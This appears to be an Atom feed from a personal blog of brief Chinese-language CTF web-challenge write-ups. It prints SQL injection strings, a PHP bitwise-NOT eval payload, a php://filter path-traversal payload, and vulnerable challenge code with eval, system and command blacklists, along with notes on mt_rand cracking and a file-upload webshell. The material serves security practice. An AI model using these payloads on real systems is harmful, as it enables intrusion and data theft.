<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Van</title>
  
  
  <link href="http://van0308.github.io/atom.xml" rel="self"/>
  
  <link href="http://van0308.github.io/"/>
  <updated>2023-04-26T15:16:00.683Z</updated>
  <id>http://van0308.github.io/</id>
  
  <author>
    <name>Van</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[b01lers2020]Life on Mars</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/b01lers2020-Life-on-Mars/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/b01lers2020-Life-on-Mars/</id>
    <published>2023-04-26T15:15:15.000Z</published>
    <updated>2023-04-26T15:16:00.683Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;SQL注入&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[GKCTF 2021]easycms</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/GKCTF-2021-easycms/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/GKCTF-2021-easycms/</id>
    <published>2023-04-26T14:22:24.000Z</published>
    <updated>2023-04-26T15:12:20.449Z</updated>
    
    <content type="html"><![CDATA[<p>搜一下发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?mode=getconfig</span><br><span class="line">得到版本</span><br><span class="line">version&quot;:&quot;7.7</span><br><span class="line">然后继续 访问admin.php</span><br><span class="line">根据提示说五位弱密码，那么直接猜12345 进入</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据网上的步骤来就行了</p><p>我是用文件上传加编辑代码的</p><p>执行操作的时候甚至还火绒报毒了，还得把火绒关了才行。</p><p>然后代码重写之后，修改会不刷新结果。那么去上传文件的地方重新点修改然后直接保存，再刷新主页就得到结果了。（差不多这样）</p><p><a href="https://blog.csdn.net/scrawman/article/details/122619270">https://blog.csdn.net/scrawman/article/details/122619270</a></p><p><a href="https://blog.csdn.net/LYJ20010728/article/details/120005727">https://blog.csdn.net/LYJ20010728/article/details/120005727</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/118873773">https://blog.csdn.net/solitudi/article/details/118873773</a></p><p><a href="https://blog.csdn.net/qq_38154820/article/details/106329727">https://blog.csdn.net/qq_38154820/article/details/106329727</a></p><p><a href="https://blog.csdn.net/LYJ20010728/article/details/120005727">https://blog.csdn.net/LYJ20010728/article/details/120005727</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;搜一下发现&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;index.php?mode=getconfig&lt;/span&gt;&lt;br&gt;&lt;spa</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[SUCTF 2018]GetShell</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/SUCTF-2018-GetShell/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/SUCTF-2018-GetShell/</id>
    <published>2023-04-26T13:38:21.000Z</published>
    <updated>2023-04-26T15:14:25.712Z</updated>
    
    <content type="html"><![CDATA[<p>黑名单</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很多黑名单</span><br><span class="line">字母数字都被ban了好像</span><br></pre></td></tr></table></figure><p>文件上传无字母数字</p><p><a href="https://blog.csdn.net/qq_43431158/article/details/108089364">https://blog.csdn.net/qq_43431158/article/details/108089364</a></p><p><a href="https://www.cnblogs.com/Jleixin/p/13289150.html">https://www.cnblogs.com/Jleixin/p/13289150.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;黑名单&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;很多黑名单&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;字母数字都被</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>October2019 Twice SQL Injection</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/October2019-Twice-SQL-Injection/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/October2019-Twice-SQL-Injection/</id>
    <published>2023-04-26T13:35:33.000Z</published>
    <updated>2023-04-26T13:37:01.828Z</updated>
    
    <content type="html"><![CDATA[<p>二次注入</p><p>测试是单引号闭合＋一咧显示</p><p>username&#x3D;1’ union select flag from flag#&amp;password&#x3D;1</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;二次注入&lt;/p&gt;
&lt;p&gt;测试是单引号闭合＋一咧显示&lt;/p&gt;
&lt;p&gt;username&amp;#x3D;1’ union select flag from flag#&amp;amp;password&amp;#x3D;1&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[ISITDTU 2019]EasyPHP</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/ISITDTU-2019-EasyPHP/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/ISITDTU-2019-EasyPHP/</id>
    <published>2023-04-25T16:16:19.000Z</published>
    <updated>2023-04-26T11:35:23.808Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[&#x27;_&#x27;];</span><br><span class="line">if ( preg_match(&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;, $_) )</span><br><span class="line">    die(&#x27;rosé will not do it&#x27;);</span><br><span class="line"></span><br><span class="line">if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )</span><br><span class="line">    die(&#x27;you are so close, omg&#x27;);</span><br><span class="line"></span><br><span class="line">eval($_);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;highlight_file</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[极客大挑战 2020]Greatphp</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Greatphp/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Greatphp/</id>
    <published>2023-04-25T16:08:23.000Z</published>
    <updated>2023-04-26T11:34:44.857Z</updated>
    
    <content type="html"><![CDATA[<p>反序列化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line">    public $syc;</span><br><span class="line">    public $lover;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;</span><br><span class="line">           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;, $this-&gt;syc, $match))&#123;</span><br><span class="line">               eval($this-&gt;syc);</span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               die(&quot;Try Hard !!&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;great&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;great&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;反序列化&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;e</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>EasyBypass</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/EasyBypass/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/EasyBypass/</id>
    <published>2023-04-25T16:07:07.000Z</published>
    <updated>2023-04-25T16:07:26.412Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$comm1 = $_GET[&#x27;comm1&#x27;];</span><br><span class="line">$comm2 = $_GET[&#x27;comm2&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1))</span><br><span class="line">    $comm1 = &quot;&quot;;</span><br><span class="line">if(preg_match(&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2))</span><br><span class="line">    $comm2 = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">$flag = &quot;#flag in /flag&quot;;</span><br><span class="line"></span><br><span class="line">$comm1 = &#x27;&quot;&#x27; . $comm1 . &#x27;&quot;&#x27;;</span><br><span class="line">$comm2 = &#x27;&quot;&#x27; . $comm2 . &#x27;&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;file $comm1 $comm2&quot;;</span><br><span class="line">system($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;sp</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[SCTF2019]Flag Shop</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/SCTF2019-Flag-Shop/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/SCTF2019-Flag-Shop/</id>
    <published>2023-04-25T15:50:22.000Z</published>
    <updated>2023-04-26T11:35:30.092Z</updated>
    
    <content type="html"><![CDATA[<p>新东西</p><p>ruby注入</p><p>还以为是js</p><p>本来想爆破jwt的，结果有robots.txt，里面提示得到了源码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require &#x27;sinatra&#x27;</span><br><span class="line">require &#x27;sinatra/cookies&#x27;</span><br><span class="line">require &#x27;sinatra/json&#x27;</span><br><span class="line">require &#x27;jwt&#x27;</span><br><span class="line">require &#x27;securerandom&#x27;</span><br><span class="line">require &#x27;erb&#x27;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &#x27;/static&#x27;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &#x27;/../log/http.log&#x27;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &#x27;/shop&#x27;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&#x27;/shop&#x27;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>新东西，那之后再来做。</p><p><a href="https://www.anquanke.com/post/id/86867">https://www.anquanke.com/post/id/86867</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;新东西&lt;/p&gt;
&lt;p&gt;ruby注入&lt;/p&gt;
&lt;p&gt;还以为是js&lt;/p&gt;
&lt;p&gt;本来想爆破jwt的，结果有robots.txt，里面提示得到了源码。&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[WMCTF2020]Make PHP Great Again</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/WMCTF2020-Make-PHP-Great-Again/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/WMCTF2020-Make-PHP-Great-Again/</id>
    <published>2023-04-25T15:12:53.000Z</published>
    <updated>2023-04-26T12:23:31.456Z</updated>
    
    <content type="html"><![CDATA[<p>require_once绕过，直接找网上的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>原理</p><p><a href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;require_once绕过，直接找网上的payload&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;php://filter/con</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[极客大挑战 2020]Roamphp1-Welcome</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp1-Welcome/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp1-Welcome/</id>
    <published>2023-04-25T15:06:16.000Z</published>
    <updated>2023-04-26T11:34:48.058Z</updated>
    
    <content type="html"><![CDATA[<p>一顿操作没发现什么，抓包，发现不允许get，改一下post就有源码了。</p><p>sha1强等于绕过。用数组绕过即可</p><p>roam1[]&#x3D;1&amp;roam2[]&#x3D;2</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一顿操作没发现什么，抓包，发现不允许get，改一下post就有源码了。&lt;/p&gt;
&lt;p&gt;sha1强等于绕过。用数组绕过即可&lt;/p&gt;
&lt;p&gt;roam1[]&amp;#x3D;1&amp;amp;roam2[]&amp;#x3D;2&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[MRCTF2020]Ezaudit</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/MRCTF2020-Ezaudit/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/MRCTF2020-Ezaudit/</id>
    <published>2023-04-25T14:31:03.000Z</published>
    <updated>2023-04-26T11:35:27.154Z</updated>
    
    <content type="html"><![CDATA[<p>打开得到一个类似官网之类的网站</p><p>一顿操作无果后，扫一下，发现有<a href="http://www.zip/">www.zip</a></p><p>而里面有index.php，源码得到了，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&#x27;Content-type:text/html; charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_POST[&#x27;login&#x27;]))&#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">    $Private_key = $_POST[&#x27;Private_key&#x27;];</span><br><span class="line">    if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123;</span><br><span class="line">        // 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    else if($Private_key != &#x27;*************&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if($Private_key === &#x27;************&#x27;)&#123;</span><br><span class="line">        $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; </span><br><span class="line">        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">        mysql_select_db(&quot;test&quot;,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">// genarate public_key </span><br><span class="line">function public_key($length = 16) &#123;</span><br><span class="line">    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $public_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //genarate private_key</span><br><span class="line">  function private_key($length = 12) &#123;</span><br><span class="line">    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $private_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></pre></td></tr></table></figure><p>简单分析一下就是，利用mt_rand的随机数漏洞</p><p>搜一下就行了，之前也做过类似的，所以直接做。</p><p>爆出随机数后，利用脚本得出私钥。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($Private_key === &#x27;************&#x27;)&#123;</span><br><span class="line">       $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; </span><br><span class="line">       $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">       mysql_select_db(&quot;test&quot;,$link);</span><br><span class="line">       $result = mysql_query($getuser);</span><br><span class="line">       while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">           echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;</span><br></pre></td></tr></table></figure><p>看这一段，得出了用户名，然后密码不知道，但是我们可以简单审计一下发现，用万能密码绕过。1’ or 1&#x3D;1#</p><p>然后登录即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XuNhoueCDCGc 私钥</span><br><span class="line">注意伪随机数制作与爆破过程得与题目的php版本一致。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开得到一个类似官网之类的网站&lt;/p&gt;
&lt;p&gt;一顿操作无果后，扫一下，发现有&lt;a href=&quot;http://www.zip/&quot;&gt;www.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而里面有index.php，源码得到了，&lt;/p&gt;
&lt;figure class=&quot;highlight plai</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[GXYCTF2019]StrongestMind</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/GXYCTF2019-StrongestMind/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/GXYCTF2019-StrongestMind/</id>
    <published>2023-04-23T16:45:44.000Z</published>
    <updated>2023-04-26T11:35:08.668Z</updated>
    
    <content type="html"><![CDATA[<p>python 脚本编写</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">边敲边改</span><br><span class="line">import time</span><br><span class="line">from requests import *</span><br><span class="line">import re</span><br><span class="line">url=&quot;http://5ee91e70-c1b8-4921-84fb-34dda71ee977.node4.buuoj.cn:81/&quot;</span><br><span class="line">s=session()</span><br><span class="line">res = s.get(url=url)</span><br><span class="line">res.encoding = &quot;UTF-8&quot;</span><br><span class="line">for i in range(1001):</span><br><span class="line">    print(res.text)</span><br><span class="line">    match=re.findall(&quot;&lt;br&gt;(.*)&lt;br&gt;&quot;,res.text)</span><br><span class="line">    # print(match)</span><br><span class="line">    # print(match[0])</span><br><span class="line">    rem=re.findall(&quot;&lt;br&gt;[0-9].*&lt;br&gt;&quot;,match[0])</span><br><span class="line">    text=rem[0].replace(&quot;&lt;br&gt;&quot;,&quot;&quot;)</span><br><span class="line"># print(rem[0].replace(&quot;&lt;br&gt;&quot;,&quot;&quot;))</span><br><span class="line"># print(text)</span><br><span class="line"># num=re.findall(&quot;[0-9]*&quot;,text)</span><br><span class="line"># print(num)</span><br><span class="line"># num1=num[0]</span><br><span class="line"># num2=num[4]</span><br><span class="line"># how=re.findall(&quot;\+|\-&quot;,text)</span><br><span class="line"># print(how[0])</span><br><span class="line"># out=int(num1)+int(num2)</span><br><span class="line"># print(out)</span><br><span class="line">    all=eval(text)</span><br><span class="line">    print(eval(text))</span><br><span class="line">    data=&#123;</span><br><span class="line">        &quot;answer&quot;:all</span><br><span class="line">    &#125;</span><br><span class="line">    res=s.post(url=url,data=data)#注意由于成功后也会返回算术式子，所以得要将res更新，才能更新值。否则一直算错</span><br><span class="line">    res.encoding=&quot;UTF-8&quot;</span><br><span class="line">    print(res.text)</span><br><span class="line">    time.sleep(0.3)</span><br><span class="line">    flag=re.findall(&quot;flag&#123;.*&quot;,res.text)</span><br><span class="line">    print(i)</span><br><span class="line">    if flag:</span><br><span class="line">        print(flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;python 脚本编写&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;边敲边改&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[HFCTF2020]JustEscape</title>
    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/HFCTF2020-JustEscape/"/>
    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E5%9B%9B%E9%A1%B5/HFCTF2020-JustEscape/</id>
    <published>2023-04-23T16:42:23.000Z</published>
    <updated>2023-04-26T13:09:22.549Z</updated>
    
